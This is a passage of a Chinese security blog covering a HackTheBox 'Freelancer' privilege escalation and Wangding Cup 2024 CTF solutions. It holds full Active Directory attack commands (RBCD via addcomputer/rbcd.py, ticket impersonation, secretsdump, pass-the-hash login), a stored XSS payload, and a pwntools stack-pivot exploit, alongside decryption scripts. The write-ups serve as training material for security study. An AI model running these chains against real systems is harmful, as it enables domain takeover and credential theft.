alt="image-20241031201402294"></p><p>成功登录<code>lorra199</code>用户</p><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="bloodhound信息收集"><a href="#bloodhound信息收集" class="headerlink" title="bloodhound信息收集"></a>bloodhound信息收集</h2><p>先使用<code>bloodhound-python</code>信息搜集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -ns 10.10.11.5 --dns-tcp -d freelancer.htb -u lorra199 -p PWN3D<span class="comment">#l0rr@Armessa199 -c All --zip</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031202047153-583515341.png" alt="image-20241031202039091"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031204334572-282778564.png" alt="image-20241031204327239"></p><p>发现<code>lorra199</code>用户属于<code>AD RECYCLE BIN</code>组</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031205200402-623938844.png" alt="image-20241031205153099"></p><p>同时还注意到<code>AD RECYCLE BIN</code>组对<code>DC</code>有<code>GenericWrite</code>权限，可以修改该账户的属性，包括设置或更改允许委派到的服务列表，这可以间接实现约束委派（RBCD）</p><h2 id="RBCD"><a href="#RBCD" class="headerlink" title="RBCD"></a>RBCD</h2><blockquote><p>在计算机对象上滥用 <code>GenericWrite</code> 的一种方法是在域上创建一台假计算机，然后写入 DC，该假计算机能够作为 DC 进行委派（使用基于资源的约束委派 （RBCD））。然后，我可以作为 DC 请求票证并充当 DC。</p></blockquote><ul><li>添加计算机</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addcomputer.py -computer-name <span class="string">&#x27;Ya$&#x27;</span> -computer-pass <span class="string">&#x27;Aa123456!&#x27;</span> -dc-host freelancer.htb -domain-netbios freelancer.htb freelancer.htb/lorra199:<span class="string">&#x27;PWN3D#l0rr@Armessa199&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031205840693-1296189239.png" alt="image-20241031205832864"></p><ul><li>使用RBCD，如果这台 PC 属于“域管理员”组，我们将授予它冒充为用户“管理员”的权限</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rbcd.py -delegate-from <span class="string">&#x27;Ya$&#x27;</span> -delegate-to <span class="string">&#x27;DC$&#x27;</span> -dc-ip 10.10.11.5 -action <span class="string">&#x27;write&#x27;</span> <span class="string">&#x27;freelancer.htb/lorra199:PWN3D#l0rr@Armessa199&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031210246405-289400388.png" alt="image-20241031210239085"></p><ul><li>使用getST获取服务票证以访问服务CIFS</li></ul><p>在请求票据之前，先与服务器时间同步</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntpdate -s freelancer.htb</span><br></pre></td></tr></table></figure><p>再请求票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getST.py -spn <span class="string">&#x27;cifs/dc.freelancer.htb&#x27;</span> -dc-ip 10.10.11.5 -impersonate <span class="string">&#x27;administrator&#x27;</span> <span class="string">&#x27;freelancer.htb/Ya:Aa123456!&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031211232406-563143332.png" alt="image-20241031211224615"></p><p>导入票据，然后使用secretdump获取hash值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=administrator@cifs_dc.freelancer.htb@FREELANCER.HTB.ccache</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py <span class="string">&#x27;freelancer.htb/Administrator@DC.freelancer.htb&#x27;</span> -k -no-pass -dc-ip 10.10.11.5 -target-ip 10.10.11.5 -just-dc-ntl</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031211643068-790736658.png" alt="image-20241031211635032"></p><p>最后<code>evil-winrm</code>登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i freelancer.htb -u administrator -H <span class="string">&#x27;0039318f1e8274633445bce32ad1a290&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031211735148-656830288.png" alt="image-20241031211727679"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031211810839-438087994.png" alt="image-20241031211803217"></p><p>在<code>Desktop</code>找到<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">HackTheBox篇之Freelancer</summary>
    
    
    
    <category term="HackTheBox" scheme="https://ya1orin.github.io/categories/HackTheBox/"/>
    
    
    <category term="HTB" scheme="https://ya1orin.github.io/tags/HTB/"/>
    
    <category term="Windows" scheme="https://ya1orin.github.io/tags/Windows/"/>
    
    <category term="Active Directory" scheme="https://ya1orin.github.io/tags/Active-Directory/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯 青龙组 2024</title>
    <link href="https://ya1orin.github.io/posts/f29ac13a.html"/>
    <id>https://ya1orin.github.io/posts/f29ac13a.html</id>
    <published>2024-10-30T10:03:36.000Z</published>
    <updated>2024-10-30T10:10:14.079Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="WEB02："><a href="#WEB02：" class="headerlink" title="WEB02："></a>WEB02：</h2><p>访问该环境，登陆注册能随便登，会返回一个/content/hash作为路由，然后拿dirsearch扫一下只能发现一个flag路由，回显你是boss嘛？就想看其他无人机拟定执行任务？</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180453448-634328005.png" alt="image-20241030180447239"></p><p>进这个路由之后有3按钮，提交，刷新，和更新，一开始一直在试拿fenjing梭ssti，然后不成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180459681-135067479.png" alt="image-20241030180453738"></p><p>之后尝试写xss，发现存在存储型xss，之后尝试拿hackbar的xss一把梭一下，想弹到ceye.io上，咋弹都回显那个不是boss，我还以为是payload有问题，以为是要弹到当前路由</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180509840-252441728.png" alt="image-20241030180503515"></p><p>之后看响应包，突然发现他的提交是点击提交当前页面，boss会审核你的起飞任务清单，所以使用submit提交后，就是直接boss审核的</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180524353-506826609.png" alt="image-20241030180518438"></p><p>所以最后是需要我们把xss payload存储之后，点击submit，就是由boss提交的，然后就能把flag路由的回显输出到当前页面了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180530487-2088539579.png" alt="image-20241030180524536"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">fetch</span>(<span class="string">&#x27;/flag&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;/content/2f9f1f36782a270b689d8c0f3e9e08df&#x27;</span>,&#123;</span><br><span class="line">      <span class="attr">method</span>:<span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">      <span class="attr">headers</span>:&#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;,</span><br><span class="line">      <span class="attr">body</span>:<span class="string">&quot;content=123&quot;</span>%2bdata</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">  &lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="PWN02"><a href="#PWN02" class="headerlink" title="PWN02"></a>PWN02</h2><p>首先是一个login的登录绕过，直接按照它的要求输就好了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180537716-735995572.png" alt="image-20241030180532038"></p><p>然后过到下面的vuln函数中去打溢出，这边眼瞅着的长度肯定不够，首先想到打栈迁移,给出后续地址之后直接打</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180542217-1925355468.png" alt="image-20241030180536624"></p><p>然后看到有给出完整后门，那么就好打了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180549697-1876912266.png" alt="image-20241030180544198"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180554685-1109696381.png" alt="image-20241030180549098"></p><p>直接栈迁移打system</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180600784-1355890361.png" alt="image-20241030180554897"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io=process(&quot;./pwn&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;0192d6192424783193117245846d79b9.8nz7.dg02.ciihw.cn&quot;</span>,<span class="number">44958</span>)</span><br><span class="line">sh_address=<span class="number">0x0804A038</span></span><br><span class="line">ret_address=<span class="number">0x08048674</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter your username: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;admin\x00&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter your password: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;admin123\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">stac = <span class="built_in">int</span>(io.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stac))</span><br><span class="line"></span><br><span class="line">payload = (p32(<span class="number">0x080485E6</span>)+p32(<span class="number">0</span>)+p32(sh_address)).ljust(<span class="number">80</span>,<span class="string">b&quot;\x00&quot;</span>)+p32(stac-<span class="number">4</span>)+p32(ret_address)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;plz input your msg:\n&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="REVERSE01"><a href="#REVERSE01" class="headerlink" title="REVERSE01"></a>REVERSE01</h2><p>安卓题，有混淆，先找MainActivity，锁定主要逻辑如下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180611619-2052552002.png" alt="image-20241030180605900"></p><p>主要就是跟其中的check方法，发现是native层加密逻辑</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180616027-127520718.png" alt="image-20241030180610625"></p><p>那么直接解包apk去看逻辑，逻辑也相对清晰，主要加密逻辑有点眼熟，过一下gpt得知确实是sm4</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180623464-1322363819.png" alt="image-20241030180617201"></p><p>那么直接找key嗦一把试试</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180630567-2040125301.png" alt="image-20241030180625061"></p><p>注意后面的这个Z0099864的赋值有个端序问题，做一个倒序就好</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180638144-1936208116.png" alt="image-20241030180632275"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data=<span class="string">&quot;Z0099864&quot;</span></span><br><span class="line"><span class="built_in">print</span>(data[::-<span class="number">1</span>])</span><br><span class="line"><span class="comment">#4689900Z</span></span><br></pre></td></tr></table></figure><p>拼接起来之后把密文提取出来直接解SM4，跟进变量提取密文</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180642384-967731827.png" alt="image-20241030180636886"></p><p>最终解出flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180646848-1493421369.png" alt="image-20241030180641293"></p><h2 id="REVERSE02"><a href="#REVERSE02" class="headerlink" title="REVERSE02"></a>REVERSE02</h2><p>逻辑什么的都相当清楚了，然后结合题目给的信息，顾名思义四段加密</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180656646-1243407274.png" alt="image-20241030180651066"></p><p>第一段是乘以2</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180702111-692318069.png" alt="image-20241030180656553"></p><p>第二段是异或</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180705623-1786287139.png" alt="image-20241030180700192"></p><p>第三段是自定义码表的一个base64</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180710945-1425284552.png" alt="image-20241030180705465"></p><p>第四段是解一个AES</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180716007-858819302.png" alt="image-20241030180710249"></p><p><strong>EXP：</strong></p><p>其中第三段解base64的结果为</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180729798-926729124.png" alt="image-20241030180723965"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">s2=[<span class="number">0x70</span>,<span class="number">0xCC</span>,<span class="number">0x62</span>,<span class="number">0xCA</span>,<span class="number">0x60</span>,<span class="number">0x6E</span>,<span class="number">0x6C</span>,<span class="number">0x6C</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;part1:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s2)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">round</span>(s2[i]/<span class="number">2</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># #part1:81fe0766</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data=[<span class="number">0x69</span>,<span class="number">0x56</span>,<span class="number">0x45</span>,<span class="number">0x17</span>,<span class="number">0x7D</span>,<span class="number">0x0D</span>,<span class="number">0x11</span>,<span class="number">0x52</span>]</span><br><span class="line">xor_key=<span class="string">&quot;XorrLord&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\npart2:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(xor_key)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(data[i]^<span class="built_in">ord</span>(xor_key[i])),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#part2:197e1bc6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#part3:809832f4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&quot;AesMasterAesMast&quot;</span>  </span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v4 = <span class="built_in">bytes</span>([<span class="number">251</span>, <span class="number">217</span>, <span class="number">179</span>, <span class="number">171</span>, <span class="number">217</span>, <span class="number">136</span>, <span class="number">230</span>, <span class="number">11</span>, <span class="number">147</span>, <span class="number">124</span>, <span class="number">149</span>, <span class="number">235</span>, <span class="number">148</span>, <span class="number">219</span>, <span class="number">11</span>, <span class="number">84</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 AES ECB 模式解密 v4</span></span><br><span class="line">decrypted_data = cipher.decrypt(v4)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\npart4:&quot;</span>, decrypted_data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#par4:d346fe66</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拼接起来得到最终的flag为<code>wdflag&#123;81fe0766197e1bc6809832f4d346fe66&#125;</code></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="CRYPTO02"><a href="#CRYPTO02" class="headerlink" title="CRYPTO02"></a>CRYPTO02</h2><p>直接上网搜索，找到原题</p><p><a href="https://www.cnblogs.com/mumuhhh/p/17789591.html">https://www.cnblogs.com/mumuhhh/p/17789591.html</a></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180739183-1151293321.png" alt="image-20241030180733303"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180744278-69578574.png" alt="image-20241030180738691"></p><p>根据给出的脚本进行解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line">time.clock = time.time</span><br><span class="line"> </span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"> </span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span> <span class="comment"># 如果晶格达到该尺寸，则停止移除</span></span><br><span class="line"><span class="comment"># 显示有用矢量的统计数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">helpful_vectors</span>(<span class="params">BB, modulus</span>):</span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line">            </span><br><span class="line">    <span class="built_in">print</span> (nothelpful, <span class="string">&quot;/&quot;</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">&quot; vectors are not helpful&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示带有 0 和 X 的矩阵</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix_overview</span>(<span class="params">BB, bound</span>):</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">&#x27;%02d &#x27;</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>: </span><br><span class="line">                a += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">&#x27;~&#x27;</span></span><br><span class="line">        <span class="comment">#print (a)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试删除无用的向量</span></span><br><span class="line"><span class="comment"># 从当前 = n-1（最后一个向量）开始</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_unhelpful</span>(<span class="params">BB, monomials, bound, current</span>):</span><br><span class="line">    <span class="comment"># 我们从当前 = n-1（最后一个向量）开始</span></span><br><span class="line">    <span class="keyword">if</span> current == -<span class="number">1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 开始从后面检查</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(current, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="comment">#  如果它没有用</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span 